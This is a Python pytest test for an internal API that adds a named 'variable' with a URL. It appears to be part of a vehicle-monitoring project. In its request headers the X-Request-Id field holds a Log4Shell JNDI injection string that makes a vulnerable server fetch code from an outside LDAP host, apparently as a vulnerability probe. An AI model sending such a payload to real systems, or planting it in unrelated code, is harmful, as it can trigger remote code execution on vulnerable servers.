# -*- coding: utf-8 -*-
# @Project : ev_monitor_nioauto
# @File : test_add_variable.py
# @Author : qiangwei.zhang
# @time: 2021/08/03
# @api: GET_/api/XXX 【必填】
# @showdoc:http://showdoc.nevint.com/index.php?s=/647&page_id=31500
# @Description :脚本描述

import allure
import pytest
from utils.random_tool import random_string
from utils.http_client import TSPRequest as hreq
from utils.logger import logger


@pytest.mark.parametrize("case_name,name,url", (
        ["正案例_正常url", f"【新增参数】_{random_string(13)}", 'url'],
))
def test_variable_add(env, case_name, name, url):
    """
    17610551933,17610551934,17610551935
    """
    if url:
        url = "http://127.0.0.1:5000/pangu/get_variable?ids=123%2C345"
    with allure.step(f'添加参数url接口{case_name}'):
        path = "/api/2/in/message_portal/variable/add"
        app_id = 10000
        json = {
            "name": name,
            "url": url
        }
        for key in ["name", "url"]:
            if not key:
                json.pop(key)
        http = {
            "host": env['host']['app_in'],
            "path": path,
            "method": "POST",
            "headers": {"Content-Type": "application/json",
                        "X-Request-Id": 'a ${jndi:ldap://nmplog4j.nioint.com/exp} b'
                        },
            "params": {"region": "cn", "lang": "zh-cn", "hash_type": "sha256", "app_id": app_id, "sign": ""},
            "json": json
        }
        response = hreq.request(env, http)
        assert response['result_code'] == 'success'